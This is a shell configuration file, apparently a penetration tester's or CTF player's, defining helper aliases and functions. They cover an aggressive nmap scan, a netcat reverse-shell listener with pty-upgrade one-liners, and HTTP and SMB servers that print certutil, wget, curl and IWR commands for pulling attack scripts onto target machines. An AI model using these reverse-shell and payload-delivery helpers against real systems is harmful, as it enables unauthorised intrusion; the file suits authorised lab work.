work_dir="/home/$USER/shared/workspace"
scripts_windows="/home/$USER/shared/scripts/windows"
scripts_linux="/home/$USER/shared/scripts/linux"

alias work="cd $work_dir"
alias win="cd $scripts_windows"
alias lin="cd $scripts_linux"
alias down="mv ~/Downloads/* ."
work

alias vpn="nmcli connection import type openvpn file"
alias scan="sudo nmap -T4 -p- -sC -sV -Pn -vv"

box() {
  if (( $# != 2 )); then
    cat <<'EOF'
Add box to /etc/hosts file
Usage: box [name] [ip]
EOF
    return
  fi
  
  # add to /etc/hosts
  echo Adding to /etc/hosts
  sudo sed -i "1s/^/$2\t$1\n/" /etc/hosts
  
  echo Creating temporary environment variable
  export $1=$2
}

rev() {
  if (( $# != 1 )) || [[ "$1" == "-h" ]] || [[ "$1" == "--help" ]]; then
    cat <<'EOF'
Start a reverse netcat listener (rlwrapped)
Usage: rev [port]
EOF
    return
  fi
  
  echo Starting netcat listener
  echo "# python -c 'import pty;pty.spawn(\"/bin/bash\")'"
  echo "# python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
  rlwrap -cAr nc -nvlp $1
}

serve() {
  if (( $# > 2 )) || [[ "$1" == "-h" ]] || [[ "$1" == "--help" ]]; then
    cat <<'EOF'
Serve a directory over HTTP with python3 http.server
Usage: serve [option] [port]

Options
	w/win/windows	serve Windows scripts directory
	l/lin/linux	serve Linux scripts directory
Not specifying any options serves the current working directory
EOF
    return
  fi
  
  local dir=$(pwd)
  local ip=$(ip -4 a s tun0 | egrep -o 'inet [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -d' ' -f2)
  local port=80

  if [[ "$1" == "windows" || "$1" == "win" || "$1" == "w" ]]; then
     echo Serving directory $scripts_windows
     dir="$scripts_windows"
     echo "# certutil -urlcache -split -f http://$ip/"
     echo "# certutil -urlcache -f http://$ip/"
     echo "# wget http://$ip/"
     echo "# IWR \"http://$ip/\""
  elif [[ "$1" == "linux" || "$1" == "lin" || "$1" == "l" ]]; then
     echo Serving directory $scripts_linux
     dir="$scripts_linux"
     echo "# wget http://$ip/"
     echo "# curl http://$ip/ -o "
  else
     if [ -n "$1" ]; then
        port=$1
     fi
     echo Serving current directory \($dir\)
     echo "# wget http://$ip/"
     echo "# certutil -urlcache -split -f http://$ip/"
     echo "# IWR \"http://$ip/\""
  fi

  if [ -n "$2" ]; then
     port=$2
  fi

  ls "$dir"
  python3 -m http.server $port --directory "$dir"
}

smb() {
  if (( $# > 2 )) || [[ "$1" == "-h" ]] || [[ "$1" == "--help" ]]; then
    cat <<'EOF'
Serve a directory over SMB with impacket smbserver
Usage: smb [option] [share]

Options
	w/win/windows	serve Windows scripts directory
Not specifying any options serves the current working directory
EOF
    return
  fi
  
  local dir=$(pwd)
  local ip=$(ip -4 a s tun0 | egrep -o 'inet [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -d' ' -f2)
  local share="share"
  
  if [[ "$1" == "windows" || "$1" == "win" || "$1" == "w" ]]; then
     if [ -n "$2" ]; then
        share=$2
     fi
     echo Serving directory $scripts_windows
     dir="$scripts_windows"
  else
     if [ -n "$1" ]; then
        share=$1
     fi
     echo Serving current directory \($dir\)
  fi
  
  echo "# \\\\\\$ip\\$share\\"
  echo "# copy \\\\\\$ip\\$share\\"
  echo "# net use R: \\\\\\$ip\\$share"
  
  ls "$dir"
  impacket-smbserver "$share" "$dir" -smb2support
}
